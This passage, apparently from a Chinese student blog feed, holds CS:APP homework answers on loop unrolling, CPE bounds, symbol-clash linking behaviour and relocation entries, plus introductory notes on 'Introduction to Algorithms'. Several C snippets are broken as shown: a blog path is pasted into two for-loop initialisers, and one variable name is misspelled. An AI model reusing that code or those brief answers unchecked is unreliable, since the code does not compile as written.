<h2 id="题一：p376家庭作业5-15"><a href="#题一：p376家庭作业5-15" class="headerlink" title="题一：p376家庭作业5.15"></a>题一：p376家庭作业5.15</h2><h3 id="A、画关键路径"><a href="#A、画关键路径" class="headerlink" title="A、画关键路径"></a>A、画关键路径</h3><p><img src="/2021/05/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A5/image-20210524172744364.png" alt="image-20210524172744364"></p>
<p><img src="/2021/05/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A5/image-20210524174834951.png" alt="image-20210524174834951"></p>
<p><img src="/2021/05/23/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A5/image-20210524175909779.png" alt="image-20210524175909779"></p>
<h3 id="B、对于float数据类型，关键路径决定的CPE下限是什么"><a href="#B、对于float数据类型，关键路径决定的CPE下限是什么" class="headerlink" title="B、对于float数据类型，关键路径决定的CPE下限是什么"></a>B、对于float数据类型，关键路径决定的CPE下限是什么</h3><p>单精度的加法运算的延迟CPE是3</p>
<h3 id="C、整数数据的关键路径决定的CPE的下界是什么"><a href="#C、整数数据的关键路径决定的CPE的下界是什么" class="headerlink" title="C、整数数据的关键路径决定的CPE的下界是什么"></a>C、整数数据的关键路径决定的CPE的下界是什么</h3><p>整数的加法运算的延迟CPE是1</p>
<h3 id="D、解释两个浮点版本的CPE为什么都是3，即使乘法需要4-5个周期"><a href="#D、解释两个浮点版本的CPE为什么都是3，即使乘法需要4-5个周期" class="headerlink" title="D、解释两个浮点版本的CPE为什么都是3，即使乘法需要4-5个周期"></a>D、解释两个浮点版本的CPE为什么都是3，即使乘法需要4-5个周期</h3><p>因为单精度和双精度的加法运算CPE都是3。</p>
<p>对于乘法运算来说，因为没有数据相关，所以它可以进行流水线式地执行，发射时间是1，不会比3更大。</p>
<h2 id="题二：p376家庭作业5-16"><a href="#题二：p376家庭作业5-16" class="headerlink" title="题二：p376家庭作业5.16"></a>题二：p376家庭作业5.16</h2><h3 id="三次循环展开的代码："><a href="#三次循环展开的代码：" class="headerlink" title="三次循环展开的代码："></a>三次循环展开的代码：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inner5</span><span class="params">(vec_ptr x, vec_ptr y, <span class="keyword">data_t</span> *dest)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> length = vec_length(x);</span><br><span class="line">	<span class="keyword">data_t</span> *xdata = get_vec_start(x);</span><br><span class="line">	<span class="keyword">data_t</span> *ydata = get_vec_start(y);</span><br><span class="line">	<span class="keyword">data_t</span> sum = (<span class="keyword">data_t</span>) <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">int</span> limit = length - <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">for</span> (深入理解计算机系统——课程作业<span class="number">5</span>/i = <span class="number">0</span>; i &lt; limit; i += <span class="number">3</span>) &#123;</span><br><span class="line">		sum = sum + xdata[i] * ydata[i]</span><br><span class="line">		      + xdata[i + <span class="number">1</span>] * ydata[i + <span class="number">1</span>]</span><br><span class="line">		      + xdata[i + <span class="number">2</span>] * ydata[i + <span class="number">2</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (; i &lt; length; i++) &#123;</span><br><span class="line">		sum = sum + xdata[i] * ydata[i];</span><br><span class="line">	&#125;</span><br><span class="line">	*dest = sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="A、解释为什么任何版本的内积过程都不能达到比2更小的CPE"><a href="#A、解释为什么任何版本的内积过程都不能达到比2更小的CPE" class="headerlink" title="A、解释为什么任何版本的内积过程都不能达到比2更小的CPE"></a>A、解释为什么任何版本的内积过程都不能达到比2更小的CPE</h3><p>由于加载单元每个时钟周期只能启动一条加载操作。</p>
<p>如果每次计算时要从两个存储器位置中加载数据，就要分两次进行，所以CPE不可能小于2</p>
<h3 id="B、为什么浮点数据的性能不会通过循环展开得到提高。"><a href="#B、为什么浮点数据的性能不会通过循环展开得到提高。" class="headerlink" title="B、为什么浮点数据的性能不会通过循环展开得到提高。"></a>B、为什么浮点数据的性能不会通过循环展开得到提高。</h3><p>因为关键路径还是length个浮点加法，虽然迭代次数减半了，但是每次迭代中还是有两个顺序的加法操作。</p>
<h2 id="题三：p376家庭作业5-20"><a href="#题三：p376家庭作业5-20" class="headerlink" title="题三：p376家庭作业5.20"></a>题三：p376家庭作业5.20</h2><h3 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">poly_optimized</span><span class="params">(<span class="keyword">double</span> a[], <span class="keyword">double</span> x, <span class="keyword">int</span> degree)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">double</span> result = a[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">double</span> xpwr = x;</span><br><span class="line">	<span class="keyword">double</span> x2 = x * x;</span><br><span class="line">	<span class="keyword">double</span> x3 = x2 * x;</span><br><span class="line">	<span class="keyword">double</span> x4 = x3 * x;</span><br><span class="line">	<span class="keyword">double</span> x5 = x4 * x;</span><br><span class="line">	<span class="keyword">double</span> x6 = x5 * x;</span><br><span class="line">	<span class="keyword">int</span> limit = degree - <span class="number">5</span>;</span><br><span class="line">	<span class="keyword">for</span> (深入理解计算机系统——课程作业<span class="number">5</span>/i = <span class="number">1</span>; i &lt;= limit; i += <span class="number">6</span>) &#123;</span><br><span class="line">		<span class="keyword">double</span> result1 = a[i] + a[i + <span class="number">1</span>] * x;</span><br><span class="line">		<span class="keyword">double</span> result2 = a[i + <span class="number">2</span>] * x2 + a[i + <span class="number">3</span>] * x3;</span><br><span class="line">		<span class="keyword">double</span> result3 = a[i + <span class="number">4</span>] * x4 + a[i + <span class="number">5</span>] * x5;</span><br><span class="line">		result += (rseult1 + result2 + result3) * xpwr;</span><br><span class="line">		xpwr *= x6;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (; i &lt;= degree; i++) &#123;</span><br><span class="line">		result += a[i] * xpwr;</span><br><span class="line">		xpwr *= x;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><p>代码采用的是直接求值的方法，不是Homer法。</p>
<p>优化的方法有：</p>
<ol>
<li>消除循环的低效率，limit=degree-5，不用每次都计算degree-5；</li>
<li>循环展开，展开六次，每次算六个a；</li>
<li>三路并行，临时变量存储；</li>
<li>关键路径决定的CPE是双精度乘法延迟的六分之一，但是因为加载操作每个周期一次，所以CPE还是1.</li>
</ol>
]]></content>
      <categories>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
      </tags>
  </entry>
  <entry>
    <title>深入理解计算机系统——课程作业7</title>
    <url>/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A7/</url>
    <content><![CDATA[<h1 id="深入理解计算机系统——课程作业7"><a href="#深入理解计算机系统——课程作业7" class="headerlink" title="深入理解计算机系统——课程作业7"></a>深入理解计算机系统——课程作业7</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>正准备做buflab突然发现了新的课程作业，先做简单的。</p>
<h2 id="题一"><a href="#题一" class="headerlink" title="题一"></a>题一</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>现有两段代码（分别是两个.c文件），如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> d = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	x = <span class="number">100</span>;</span><br><span class="line">	p();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;d=%d\n&quot;</span>, d);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;x=%d\n&quot;</span>, x);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//pl.c</span></span><br><span class="line"><span class="keyword">double</span> x = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	x = <span class="number">1.0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请问通过分离编译、链接后，屏幕打印输出是什么（请贴图为证）？</p>
<p>结合链接一章所学相关知识，请分析解释为什么会有这个结果，可结合 objdump, readelf, nm 等工具辅助分析（请呈现你的分析过程）。</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><strong>输出结果如下</strong></p>
<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A7/image-20210602093820902.png" alt="image-20210602093820902"></p>
<p>我们想知道到底输出了什么，使用objdump查看反汇编代码，查看p和main函数的指令</p>
<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A7/image-20210602115531512.png" alt="image-20210602115531512"></p>
<p>发现最后输出0x804a020地址的内容，于是我们使用gdb调试下断点在*main+24，就是输出之前的位置，然后运行调试</p>
<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A7/image-20210602123845576.png" alt="image-20210602123845576"></p>
<p>我们发现0x804a020地址的内容，在运行之前是0x00000000 0x00000000，运行到断点处是0x00000000 0x3ff00000</p>
<p>所以最后输出的是0x00000000也就是0</p>
<p><strong>分析原因：</strong>double类型是8字节的，按照%d输出四个字节的话，不会输出0x3ff0000000000000（double 1.0）而是它的后四个字节0x00000000（int 0）</p>
<h2 id="题二"><a href="#题二" class="headerlink" title="题二"></a>题二</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>现有两段代码（分别是两个.c文件），如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> d = <span class="number">100</span>;</span><br><span class="line"><span class="keyword">int</span> x = <span class="number">200</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	p( );</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;d = % d, x = % d\n&quot;</span>, d, x);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//p.c</span></span><br><span class="line"><span class="keyword">double</span> d;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">p</span><span class="params">( )</span> </span>&#123;</span><br><span class="line">	d = <span class="number">1.0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请问通过分离编译、链接后，屏幕打印输出是什么（请贴图为证）？</p>
<p>结合链接一章所学相关知识，请分析解释为什么会有这个结果，可结合 objdump, readelf, nm 等工具辅助分析（请呈现你的分析过程）。</p>
<h3 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h3><p>输出结果如下<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A7/image-20210602130523997.png" alt="image-20210602130523997"></p>
<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A7/image-20210602130414470.png" alt="image-20210602130414470"></p>
<p>分析原因：从汇编代码中我们可以知道，函数p还是赋给d一个0x3ff0000000000000（double 1.0），调试验证确实是double 1.0，然后先输出0x804a014地址的值0x00000000（int 0），然后输出0x804a018地址的值0x3ff00000（int 1072693248）<br><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A7/image-20210602134224920.png" alt="image-20210602134224920"></p>
<h2 id="题三：P476-家庭作业7-12"><a href="#题三：P476-家庭作业7-12" class="headerlink" title="题三：P476 家庭作业7.12"></a>题三：P476 家庭作业7.12</h2><table>
<thead>
<tr>
<th align="center">图7-10中的行号</th>
<th align="center">地址</th>
<th align="center">值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">15（bufp0）</td>
<td align="center">0x080483cb</td>
<td align="center">0x0804945c</td>
</tr>
<tr>
<td align="center">16（buf[1]）</td>
<td align="center">0x080483d0</td>
<td align="center">0x08049458</td>
</tr>
<tr>
<td align="center">18（bufp1）</td>
<td align="center">0x080483d8</td>
<td align="center">0x08049548</td>
</tr>
<tr>
<td align="center">18（buf[1]）</td>
<td align="center">0x080483dc</td>
<td align="center">0x08049458</td>
</tr>
<tr>
<td align="center">23（bufp1）</td>
<td align="center">0x080483e7</td>
<td align="center">0x08049548</td>
</tr>
</tbody></table>
<h2 id="题四：P478-家庭作业7-14"><a href="#题四：P478-家庭作业7-14" class="headerlink" title="题四：P478 家庭作业7.14"></a>题四：P478 家庭作业7.14</h2><h3 id="A、-text节重定位修改的指令"><a href="#A、-text节重定位修改的指令" class="headerlink" title="A、.text节重定位修改的指令"></a>A、.text节重定位修改的指令</h3><p>.text存放的是已编译程序的机器代码</p>
<p>第7,10,12,13,15行的指令，因为不是32位的地址，不需要重定位。</p>
<table>
<thead>
<tr>
<th align="center">节偏移</th>
<th align="center">重定位类型</th>
<th align="center">符号名字</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0x11</td>
<td align="center">R_386_32</td>
<td align="center">.rodata</td>
</tr>
</tbody></table>
<h3 id="B、-rodata节修改的数据"><a href="#B、-rodata节修改的数据" class="headerlink" title="B、.rodata节修改的数据"></a>B、.rodata节修改的数据</h3><p>.rodata在这里存放的是switch语句的跳转表。</p>
<table>
<thead>
<tr>
<th align="center">节偏移</th>
<th align="center">重定位类型</th>
<th align="center">符号名字</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0x0</td>
<td align="center">R_386_32</td>
<td align="center">relo3</td>
</tr>
<tr>
<td align="center">0x4</td>
<td align="center">R_386_32</td>
<td align="center">relo3</td>
</tr>
<tr>
<td align="center">0x8</td>
<td align="center">R_386_32</td>
<td align="center">relo3</td>
</tr>
<tr>
<td align="center">0xc</td>
<td align="center">R_386_32</td>
<td align="center">relo3</td>
</tr>
<tr>
<td align="center">0x10</td>
<td align="center">R_386_32</td>
<td align="center">relo3</td>
</tr>
<tr>
<td align="center">0x14</td>
<td align="center">R_386_32</td>
<td align="center">relo3</td>
</tr>
</tbody></table>
<h2 id="题五：P479-家庭作业7-15"><a href="#题五：P479-家庭作业7-15" class="headerlink" title="题五：P479 家庭作业7.15"></a>题五：P479 家庭作业7.15</h2><h3 id="A、libc-a和libm-a的版本中包含多少目标文件？"><a href="#A、libc-a和libm-a的版本中包含多少目标文件？" class="headerlink" title="A、libc.a和libm.a的版本中包含多少目标文件？"></a>A、libc.a和libm.a的版本中包含多少目标文件？</h3><p>在Ubuntu12.04.5系统下进行</p>
<p>先使用locate命令寻找.a文件</p>
<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A7/image-20210602083937856.png" alt="image-20210602083937856"></p>
<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A7/image-20210602084001274.png" alt="image-20210602084001274"></p>
<p>然后查看文件，发现：</p>
<p><img src="/2021/05/29/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E2%80%94%E2%80%94%E8%AF%BE%E7%A8%8B%E4%BD%9C%E4%B8%9A7/image-20210612221510633.png" alt="image-20210612221510633"></p>
<h3 id="B、gcc-O2产生的可执行代码和gcc-O2-g产生的不同？"><a href="#B、gcc-O2产生的可执行代码和gcc-O2-g产生的不同？" class="headerlink" title="B、gcc -O2产生的可执行代码和gcc -O2 -g产生的不同？"></a>B、gcc -O2产生的可执行代码和gcc -O2 -g产生的不同？</h3><p>-g选项生成的可执行目标文件多两个节</p>
<p><strong>.debug：</strong>一个调试符号表。包括局部变量、全局变量以及原始的C源文件。</p>
<p><strong>.line：</strong>原始C源程序中的行号和.text节中机器指令之间的映射。</p>
<h3 id="C、GCC驱动程序使用的是什么共享库？"><a href="#C、GCC驱动程序使用的是什么共享库？" class="headerlink" title="C、GCC驱动程序使用的是什么共享库？"></a>C、GCC驱动程序使用的是什么共享库？</h3><p><strong>libc.so共享库</strong></p>
]]></content>
      <categories>
        <category>CS:APP</category>
      </categories>
      <tags>
        <tag>课程作业</tag>
      </tags>
  </entry>
  <entry>
    <title>算法导论——基本内容介绍</title>
    <url>/2021/06/10/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E5%86%85%E5%AE%B9%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h1 id="算法导论——基本内容介绍"><a href="#算法导论——基本内容介绍" class="headerlink" title="算法导论——基本内容介绍"></a>算法导论——基本内容介绍</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>因为学校的书看不懂，所以想换本书看看</p>
<p>我在网上找到的是第三版，所以都是基于第三版做的学习笔记</p>
<h2 id="大致介绍"><a href="#大致介绍" class="headerlink" title="大致介绍"></a>大致介绍</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>算法是计算的核心。本书提供了对当代计算机算法研究的一个全面的、综合性的介绍。</p>
<p><img src="/2021/06/10/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E2%80%94%E2%80%94%E5%9F%BA%E6%9C%AC%E5%86%85%E5%AE%B9%E4%BB%8B%E7%BB%8D/image-20210610130216994.png" alt="image-20210610130216994"></p>
<p>确实是大家的希望（dog）！中国大学生苦答案久矣！</p>
<h3 id="第一部分：基础知识"><a href="#第一部分：基础知识" class="headerlink" title="第一部分：基础知识"></a>第一部分：基础知识</h3><p>这一部分将引导读者开始<strong>思考算法的设计和分析问题</strong>，<strong>简单介绍算法的表达方法</strong>、将在本书中<strong>用到的一些设计策略</strong>，以及<strong>算法分析中用到的许多基本思想</strong>。本章节后面的内容都是建立在这些基础知识之上的。</p>
<h4 id="第1章是对算法及其在现代计算系统中地位的一个综述。"><a href="#第1章是对算法及其在现代计算系统中地位的一个综述。" class="headerlink" title="第1章是对算法及其在现代计算系统中地位的一个综述。"></a>第1章是对算法及其在现代计算系统中地位的一个综述。</h4><p>本章给出了<strong>算法的定义</strong>和<strong>一些算法的例子</strong>。</p>
<p>此外，本章还说明了<strong>算法是一项技术</strong>，就像快速的硬件、图形用户界面、面向对象系统和网络一样。</p>
<h4 id="在第2章中，我们给出了书中的第一批算法，它们解决的是对n个数进行排序的问题。"><a href="#在第2章中，我们给出了书中的第一批算法，它们解决的是对n个数进行排序的问题。" class="headerlink" title="在第2章中，我们给出了书中的第一批算法，它们解决的是对n个数进行排序的问题。"></a>在第2章中，我们给出了书中的第一批算法，它们解决的是对n个数进行排序的问题。</h4><p>这些算法是用一种<strong>伪代码</strong>形式给出的，这种伪代码尽管不能直接翻译为任何常规的程序设计语言，但是足够清晰地表达了算法的结构，以便任何一位能力比较强的程序员都能用自己选择的语言将算法实现出来。</p>
<p>我们分析的排序算法是<strong>插入排序</strong>，它采用了一种增量式的做法;</p>
<p>另外还分析了<strong>归并排序</strong>，它采用了一种递归技术，称为“<strong>分治法</strong>”。</p>
<p>尽管这两种算法所需的运行时间都随n的值而增长，但增长的速度是不同的。</p>
<p>我们在第2章分析了这两种算法的运行时间，并<strong>给出了一种有用的表示方法来表达这些运行时间</strong>。</p>
<h4 id="第3章给出了这种表示法的准确定义，称为渐近表示。"><a href="#第3章给出了这种表示法的准确定义，称为渐近表示。" class="headerlink" title="第3章给出了这种表示法的准确定义，称为渐近表示。"></a>第3章给出了这种表示法的准确定义，称为渐近表示。</h4><p>在第3章的一开始，首先<strong>定义几种渐近符号</strong>，它们主要用于<strong>表示算法运行时间</strong>的<strong>上界和下界</strong>。</p>
<p>第3章余下的部分主要给出了一些<strong>数学表示方法</strong>。这一部分的作用更多的是为了确保读者所用的记号能与本书的记号体系相匹配，而不是教授新的数学概念。</p>
<h4 id="第4章更深人地讨论了第2章引入的分治法，给出了更多分治法的例子，包括用于两方阵相乘的Strassen方法。"><a href="#第4章更深人地讨论了第2章引入的分治法，给出了更多分治法的例子，包括用于两方阵相乘的Strassen方法。" class="headerlink" title="第4章更深人地讨论了第2章引入的分治法，给出了更多分治法的例子，包括用于两方阵相乘的Strassen方法。"></a>第4章更深人地讨论了第2章引入的分治法，给出了更多分治法的例子，包括用于两方阵相乘的Strassen方法。</h4><p>第4章包含了<strong>求解递归式的方法</strong>。<strong>递归式用于描述递归算法的运行时间。</strong></p>
<p><strong>“主方法”</strong>是一种功能很强的技术，通常用于<strong>解决分治算法中出现的递归式。</strong></p>
<p>虽然第4章中的相当一部分内容都是在<strong>证明主方法的正确性</strong>，但是如果跳过这一部分证明内容，也没有什么太大的影响。</p>
<h4 id="第5章介绍概率分析和随机化算法。"><a href="#第5章介绍概率分析和随机化算法。" class="headerlink" title="第5章介绍概率分析和随机化算法。"></a>第5章介绍概率分析和随机化算法。</h4><p><strong>概率分析一般用于确定一些算法的运行时间</strong>，在这些算法中，由于<strong>同一规模的不同输人</strong>可能有着内在的概率分布，因而在这些不同输人之下，<strong>算法的运行时间可能有所不同</strong>。</p>
<p>在有些情况下，我们假定算法的<strong>输人服从某种已知的概率分布</strong>，于是，<strong>算法的运行时间就是</strong>在所有可能的输入之下，<strong>运行时间的平均值</strong>。</p>
<p>在其他情况下，<strong>概率分布</strong>不是来自于输人，而是<strong>来自于算法执行过程中所做出的随机选择</strong>。</p>
<p>如果一个算法的行为不仅由其输人决定，还要由一个随机数生成器生成的值来决定，那么它就是一个<strong>随机化算法</strong>。</p>
<p>我们可以利用<strong>随机化算法</strong>强行<strong>使算法的输入服从某种概率分布</strong>，从而<strong>确保不会有某一输入会始终导致算法的性能变坏</strong>;</p>
<p>或者，对于那些<strong>允许产生不正确结果的算法</strong>，甚至能够将其<strong>错误率限制在某个范围之内</strong>。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>算法导论</tag>
      </tags>
  </entry>
  <entry>
    <title>算法导论——第1章</title>
    <url>/2021/06/11/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E2%80%94%E2%80%94%E7%AC%AC1%E7%AB%A0/</url>
    <content><![CDATA[<h1 id="算法导论——第1章-算法在计算中的作用"><a href="#算法导论——第1章-算法在计算中的作用" class="headerlink" title="算法导论——第1章 算法在计算中的作用"></a>算法导论——第1章 算法在计算中的作用</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>什么是算法？为什么算法值得研究？相对于计算机使用的其他技术来说算法的作用是什么？</p>
<p>本章我们将回答这些问题。</p>
<h2 id="1-1-算法"><a href="#1-1-算法" class="headerlink" title="1.1 算法"></a>1.1 算法</h2><p><strong>算法</strong>就是<strong>任何良定义（well-defined）的计算过程</strong>，该过程取某个值或值的集合作为<strong>输入</strong>并<strong>产生</strong>某个值或值的集合作为<strong>输出</strong>。</p>
<blockquote>
<p>良定义（well defined）就是指<strong>无歧义的、不会导致矛盾的、符合其应满足的所有要求</strong>的定义</p>
</blockquote>
<p><strong>问题陈述</strong>说明了期望的输入和输出之间的<strong>关系</strong>。<strong>算法</strong>描述实现这个关系的<strong>计算过程</strong>。</p>
<p><strong>问题实例</strong>由计算该问题所必须的（满足问题陈述中的各种约束条件的）<strong>输入</strong>组成。</p>
<p>若对每个<strong>输入实例</strong>，算法都以<strong>正确的输出</strong>停机，则称该算法是<strong>正确的</strong>，并称该算法<strong>解决了</strong>给定的计算问题。</p>
<p><strong>算法解决的问题：</strong></p>
<ol>
<li><strong>人类基因工程。</strong>识别人类DNA中的所有10万个基因，确定构成DNA的30亿个化学基对的序列，在数据库中<strong>存储这类信息</strong>并<strong>为数据分析开发工具</strong>。</li>
<li><strong>互联网</strong>使得全世界的人都能快速地访问与检索大量信息。借助于一些聪明的算法，互联网上的网站能够<strong>管吗理和处理这些海量数据</strong>。必须使用算法的问题示例包括为<strong>数据传输寻找好的路由</strong>（求解这些问题的技术在第24章给出），<strong>使用一个搜索引擎来快速地找到特定信息所在的网页</strong>（有关技术在11章和32章中）</li>
<li><strong>电子商务</strong>使得货物与服务能够以电子方式洽谈与交换，并且它依赖于像信用卡号、密码和银行结单这类个人信息的保密性。电子商务中使用的核心技术包括(第31章中包含的)<strong>公钥密码与数字签名，它们以数值算法和数论为基础</strong>。</li>
<li>制造业和其他商务企业常常需要<strong>按最有益的方式来分配稀有资源</strong>。一家石油公司也许希望知道在什么地方设置其油井，以便最大化其预期的利润。一位政治候选人也许想确定在什么地方花钱购买竞选广告，以便最大化赢得竞选的机会。一家航空公司也许希望按尽可能最廉价的方式把乘务员分配到班机上，以确保每个航班被覆盖并且满足政府有关乘务员调度的法规。一个互联网服务提供商也许希望确定在什么地方放置附加的资源，以便更有效地服务其顾客。所有这些都是可以用<strong>线性规划</strong>来求解的问题的例子，我们将在第29章学习这种技术。 </li>
</ol>
<p><strong>更加具体的问题：</strong></p>
<ol>
<li>给定一张交通图，上面标记了每对相邻十字路口之间的距离，我们希望确定从一个十字路口到另一个十字路口的<strong>最短道路</strong>。<br>即使不允许穿过自身的道路，可能路线的数量也会很大。在所有可能路线中，我们如何选择哪一条是最短的？<br>这里首先把交通图(它本身就是实际道路的一个模型)<strong>建模为一个图</strong>(第六部分和附录B将涉及这个概念)，然后<strong>寻找图中</strong>从一个顶点到另一个顶点的<strong>最短路径</strong>。第24章将介绍如何有效地求解这个问题。</li>
<li>给定两个<strong>有序的符号序列X和Y</strong>，求出X和Y的<strong>最长公共子序列</strong>。<br>X的<strong>子序列就是去掉一些元素</strong>(可能是所有，也可能一个没有)后的X。例如，(A，B，C，D，E，F，G)的一个子序列是(B，C，E，G)。X和Y的<strong>最长公共子序列的长度度量了这两个序列的相似程度</strong>。例如，若两个序列是DNA链中的基对则当它们具有长的公共子序列时我们认为它们是相似的。<br>若X有m个符号且Y有n个符号，则X和Y分别有2^m和2^n个可能的子序列。除非m和n很小，否则选择X和Y的所有可能子序列做匹配将花费使人望而却步多的时间。第15章将介绍如何使用一种称为<strong>动态规划</strong>的一般技术来有效地求解这个问题。</li>
